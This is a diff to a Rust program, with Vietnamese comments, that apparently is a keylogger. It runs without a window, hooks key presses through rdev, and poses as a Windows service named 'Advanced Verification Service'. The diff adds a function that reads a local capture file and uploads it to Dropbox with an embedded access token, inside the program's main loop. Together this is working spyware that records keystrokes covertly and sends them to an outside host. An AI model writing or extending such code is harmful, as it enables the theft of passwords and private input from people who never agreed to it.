@@ -1,6 +1,8 @@
 #![windows_subsystem = "windows"]
 use rdev::{listen, Event, EventType};
+use reqwest::header::{HeaderMap, HeaderValue, AUTHORIZATION, CONTENT_TYPE};
 use tokio::runtime::Runtime;
+// use std::fmt::Result; // Removed to avoid conflict with the Result type alias
 use std::fs::{self, OpenOptions};
 use std::io::Write;
 use std::path::Path;
@@ -25,7 +27,7 @@ const SERVICE_DISPLAY_NAME: &str = "AVS Service";
 const SERVICE_DESCRIPTION: &str = "Advanced Verification Service";
 const LOG_FILE: &str = "C:\\Windows\\Temp\\avs_service.log";
 
-pub const TOKEN: &str = include_str!("token.json");
+pub const TOKEN: &str = include_str!("token.txt");
 
 fn callback(event: Event) {
     if let EventType::KeyPress(key) = event.event_type {
@@ -101,7 +103,7 @@ pub async fn start_logic() {
                     Err(_) => continue
                 };
         
-                match upload_file().await{
+                match upload_file2("C:\\temp\\copy.txt").await{
                     Ok(()) => (),
                     Err(_) => ()
                 }
@@ -130,6 +132,41 @@ pub async fn start_logic() {
     // if let Err(error) = listen(callback) {
     //     println!("Error: {:?}", error);
     // }
+}
+
+async fn upload_file2(file_path: &str) -> Result<(), Box<dyn std::error::Error>> {
+        // === Cấu hình ===
+        let access_token = format!("Bearer {}", TOKEN.trim());
+        let dropbox_destination = "/test.txt";
+    
+        // === Đọc nội dung file ===
+        let file_data = fs::read(file_path)?;
+    
+        // === Tạo headers ===
+        let mut headers = HeaderMap::new();
+        headers.insert(AUTHORIZATION, HeaderValue::from_str(&access_token)?);
+        headers.insert("Dropbox-API-Arg", HeaderValue::from_str(&format!(
+            "{{\"path\": \"{}\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}}",
+            dropbox_destination
+        ))?);
+        headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/octet-stream"));
+    
+        // === Gửi request ===
+        let client = reqwest::Client::new();
+        let res = client
+            .post("https://content.dropboxapi.com/2/files/upload")
+            .headers(headers)
+            .body(file_data)
+            .send()
+            .await?;
+    
+        // === In kết quả ===
+        let status = res.status();
+        let text = res.text().await?;
+        println!("Status: {}", status);
+        println!("Response: {}", text);
+    
+        Ok(())
 }
 
 async fn upload_file() -> Result<(), Box<dyn std::error::Error>>{
